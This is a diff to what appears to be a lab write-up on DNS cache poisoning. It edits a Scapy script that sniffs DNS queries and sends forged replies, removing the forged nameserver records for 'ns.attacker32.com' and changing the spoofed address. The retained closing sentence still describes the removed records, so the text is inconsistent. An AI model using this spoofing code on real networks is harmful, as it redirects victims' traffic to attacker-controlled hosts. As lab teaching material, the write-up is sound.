@@ -50,16 +50,13 @@ def spoof_dns(pkt):
                 udp = UDP(dport=pkt[UDP].sport, sport=53) # Swap the source and destination ports
 
                 # The Answer Section
-                Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.0.2.5') # Create an answer record
-                # The Authority Section
-                NSsec1 = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.attacker32.com')
-                NSsec2 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='ns2.example.net')
-                # The Additional Section
-                Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A', ttl=259200, rdata='10.9.0.153')
-                Addsec2 = DNSRR(rrname='ns2.example.net', type='A', ttl=259200, rdata='5.6.7.8')
+                Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.9.0.1')
+
+                # The Authority Section is not needed
+                # The Additional Section is not needed
 
                 # Create DNS object
-                dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=2, an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)
+                dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=0, arcount=0, an=Anssec)
 
                 spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
                 send(spoofpkt)
@@ -70,6 +67,6 @@ pkt=sniff(iface='br-4a379a2ae130', filter=myFilter, prn=spoof_dns)
 
 When we now execute ``` dig www.example.com ``` on the ``` user ``` machine, we see this:
 
-![image](https://github.com/user-attachments/assets/3f77ea7b-ba63-4e16-ab09-781bc08a1894)
+![image](https://github.com/user-attachments/assets/393f7f25-df2c-4788-9a2b-f2476ae5434f)
 
 The answer contains the IP adress we inserted (```10.0.2.5```) and our attacker nameserver (```ns.attacker32.com```).
